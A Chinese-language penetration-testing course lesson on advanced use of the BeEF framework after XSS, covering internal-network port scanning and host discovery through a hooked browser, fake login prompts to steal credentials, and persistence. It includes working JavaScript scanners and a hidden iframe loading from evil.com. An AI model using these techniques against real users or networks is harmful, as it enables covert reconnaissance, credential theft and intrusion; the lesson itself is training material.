---
title: Day043：BeEF 进阶与内网探测
tags:
  - 网络安全
  - BeEF
  - 内网渗透
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d043
date: 2026-03-06
updated: 2026-01-28
---

# Day043：BeEF 进阶与内网探测

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 7：XSS 进阶与 CSRF |
| **今日主题** | BeEF 高级利用与内网探测 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶+ |

---

## 今日痛点场景

> **场景**：你通过 XSS 控制了内网用户的浏览器，但你在外网，无法直接访问内网资源。
>
> **问题**：能不能利用受害者的浏览器当"跳板"，探测内网？
>
> **今天的任务**：深入 BeEF 框架，学习如何利用受控浏览器进行内网探测。

---

## 今日目标

- [ ] 掌握 BeEF 高级模块使用
- [ ] 学会利用浏览器进行内网探测
- [ ] 掌握社会工程攻击模块
- [ ] 完成综合利用场景

**闯关条件**：利用 BeEF 成功探测内网存活主机。

---

## 实战任务（先动手！）

### 任务 1：BeEF 模块深入（30 分钟）

**浏览器信息收集模块**：

```
Commands → Browser →
├── Get Cookie          # 获取所有 Cookie
├── Get Visited URLs    # 获取浏览历史
├── Get Page HTML       # 获取当前页面 HTML
├── Get System Info     # 获取系统信息
└── Detect Extensions   # 检测浏览器扩展
```

**操作步骤**：
1. 确保有浏览器上线
2. 选择目标浏览器
3. 执行 "Get Cookie" 模块
4. 执行 "Get System Info" 模块
5. 观察返回结果

**记录**：
```
获取的 Cookie：________________
系统信息：________________
浏览器类型/版本：________________
```

---

### 任务 2：内网端口扫描（40 分钟）

**原理**：利用浏览器发起跨域请求，根据响应时间判断端口状态

**模块位置**：
```
Commands → Network →
├── Get Internal IP        # 获取内网 IP
├── Port Scanner          # 端口扫描
└── Ping Sweep            # 主机发现
```

**操作步骤**：

**步骤 1：获取内网 IP**
```
Commands → Network → Get Internal IP
```

**步骤 2：扫描常见端口**
```
Commands → Network → Port Scanner
- IP: 192.168.1.1  （根据实际内网段调整）
- Ports: 22,80,443,445,3389,8080,8443
```

**步骤 3：分析结果**
- 端口开放：响应时间短
- 端口关闭：响应时间长或超时

**记录**：
```
发现的内网 IP：________________
开放的端口：________________
```

---

### 任务 3：内网主机发现（35 分钟）

**模块**：Network Discovery

**原理**：
1. 向内网 IP 范围发送请求
2. 通过响应判断主机是否存活
3. 通过特定响应识别服务类型

**操作步骤**：
```
Commands → Network → Ping Sweep
- IP Range: 192.168.1.1-254
- Timeout: 1000ms
```

**技巧**：分段扫描，避免过长等待
```
第一段：192.168.1.1-50
第二段：192.168.1.51-100
...
```

**自定义 JavaScript 探测**：
```javascript
// 通过 img 标签探测主机
var target = '192.168.1.1';
var ports = [80, 8080, 443];

ports.forEach(function(port) {
  var img = new Image();
  var start = Date.now();

  img.onload = img.onerror = function() {
    var elapsed = Date.now() - start;
    if (elapsed < 100) {
      console.log(target + ':' + port + ' - Open');
    }
  };

  img.src = 'http://' + target + ':' + port + '/favicon.ico';
});
```

**记录**：
```
发现的存活主机：________________
主机数量：________________
```

---

### 任务 4：社会工程模块（35 分钟）

**模块位置**：
```
Commands → Social Engineering →
├── Fake Flash Update     # 假 Flash 更新
├── Fake Notification     # 假通知
├── Clippy               # 假微软助手
├── Google Phishing      # Google 钓鱼
└── Pretty Theft         # 凭据窃取
```

**任务：执行 Pretty Theft（凭据窃取）**

**步骤 1：选择模块**
```
Commands → Social Engineering → Pretty Theft
```

**步骤 2：配置参数**
```
- Logo URL: Facebook/Google 的 logo
- Dialog title: "Session Expired"
- Dialog message: "Please re-enter your credentials"
```

**步骤 3：执行并观察**
- 受害者浏览器会弹出仿真登录框
- 用户输入的凭据会发送到 BeEF

**记录**：
```
使用的钓鱼模板：________________
是否成功获取凭据：________________
```

---

### 任务 5：持久化控制（30 分钟）

**问题**：用户刷新或关闭页面，BeEF 连接就断了

**解决方案 1：Man-in-the-Browser**
```
Commands → Persistence → Man-in-the-Browser
```
原理：劫持页面中所有链接，点击后仍在 BeEF 控制下

**解决方案 2：隐藏 iframe**
```javascript
// 在每个页面注入隐藏 iframe
var frame = document.createElement('iframe');
frame.src = 'http://evil.com/hooked.html';
frame.style.display = 'none';
document.body.appendChild(frame);
```

**解决方案 3：Pop-Under**
```
Commands → Persistence → Create Pop Under
```
原理：创建隐藏的弹窗窗口，用户不易察觉

**记录**：
```
使用的持久化方法：________________
持久化效果：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 成功获取浏览器信息 | 20 分 |
| 成功进行内网探测 | 25 分 |
| 发现内网存活主机 | 20 分 |
| 成功执行社会工程模块 | 20 分 |
| 实现持久化控制 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 浏览器内网探测原理

```
为什么浏览器能探测内网？

1. 浏览器可以发起任意 HTTP 请求
2. 虽然跨域响应被阻止，但"连接是否成功"可以判断
3. 通过 img/script/iframe 等标签绕过部分限制
4. WebSocket 也可用于探测

判断依据：
- 连接成功快，失败慢（TCP 握手 vs 超时）
- 不同的错误响应时间不同
```

### BeEF 网络模块工作方式

```javascript
// Port Scanner 简化版原理
function scanPort(ip, port) {
  return new Promise((resolve) => {
    var img = new Image();
    var start = Date.now();

    img.onload = img.onerror = function() {
      var elapsed = Date.now() - start;
      resolve({
        ip: ip,
        port: port,
        open: elapsed < 100
      });
    };

    img.src = 'http://' + ip + ':' + port + '/';

    setTimeout(() => {
      resolve({ ip: ip, port: port, open: false });
    }, 1000);
  });
}
```

### 社会工程攻击效果

| 模块 | 适用场景 | 成功率 |
|------|----------|--------|
| Fake Flash Update | 技术不熟练用户 | 中 |
| Pretty Theft | 需要登录的场景 | 高 |
| Fake Notification | Chrome 用户 | 中 |
| Clippy | Windows 老用户 | 低（娱乐） |

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 内网 IP 获取失败 | 返回空 | WebRTC 可能被禁用，尝试其他方法 |
| 端口扫描太慢 | 等待超时 | 减少扫描范围，增加并发 |
| 社会工程不触发 | 没有弹窗 | 检查 CSP，可能阻止了内联脚本 |
| 持久化失效 | 刷新后断连 | 尝试多种持久化方式组合 |

---

## 知识卡片速查

### BeEF 内网探测流程

```
1. 获取内网 IP
   Commands → Network → Get Internal IP

2. 扫描网关
   Commands → Network → Port Scanner
   Target: 192.168.1.1

3. 主机发现
   Commands → Network → Ping Sweep
   Range: 192.168.1.1-254

4. 服务识别
   Commands → Network → Port Scanner
   Ports: 22,80,443,3389,445,8080
```

### 常见内网资产

| 端口 | 服务 | 利用价值 |
|------|------|----------|
| 22 | SSH | 远程登录 |
| 80/443 | HTTP/HTTPS | Web 服务 |
| 445 | SMB | 文件共享/MS17-010 |
| 3306 | MySQL | 数据库 |
| 3389 | RDP | 远程桌面 |
| 8080 | HTTP-Proxy/Tomcat | Web 应用 |

### 自定义 JavaScript 模板

```javascript
// 内网 Web 服务识别
function checkWebServer(ip) {
  var img = new Image();
  img.onload = function() {
    beef.net.send('<%= @command_url %>', <%= @command_id %>,
      'ip=' + ip + '&status=up&has_favicon=true');
  };
  img.onerror = function() {
    beef.net.send('<%= @command_url %>', <%= @command_id %>,
      'ip=' + ip + '&status=up&has_favicon=false');
  };
  img.src = 'http://' + ip + '/favicon.ico';
  setTimeout(function() { img.src = ''; }, 3000);
}
```

---

## 常见问题

**Q1：内网探测会被发现吗？**

A1：有可能：
- IDS/IPS 可能检测异常扫描流量
- 大量请求可能触发告警
- 但流量来自内网用户，追溯较困难

**Q2：哪些浏览器支持内网探测？**

A2：大部分现代浏览器都支持：
- Chrome/Firefox/Edge 都可以
- Safari 限制较多
- 某些企业浏览器可能有额外限制

**Q3：WebRTC 获取内网 IP 还有效吗？**

A3：效果降低了：
- Chrome 已限制 WebRTC IP 泄露
- 需要用户授权才能获取
- 但仍有其他方式可以探测

---

## 明日预告

**Day 044：Week 7 周末闯关 - XSS 与 CSRF 综合**

明天你将：
- 回顾本周所有知识点
- 完成综合挑战任务
- 输出 Week 7 学习总结

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 发现的内网主机数 | |
| 使用的社会工程模块 | |
| 今日收获 | |

---

> **导师点评**：
>
> 今天你看到了一个可怕的事实：**一个浏览器可以成为内网渗透的跳板**。
>
> 受害者可能只是点开了一个链接，他的浏览器就变成了攻击者的"内应"——扫描内网、收集信息、甚至发起进一步攻击。
>
> 这就是为什么企业要重视 XSS 漏洞：它不只是弹个窗，而是可能导致整个内网沦陷。
>
> **记住：边界安全靠防火墙，内网安全靠意识**。

```bash
echo "Day 043 Complete! 浏览器变身内网探测器！"
```
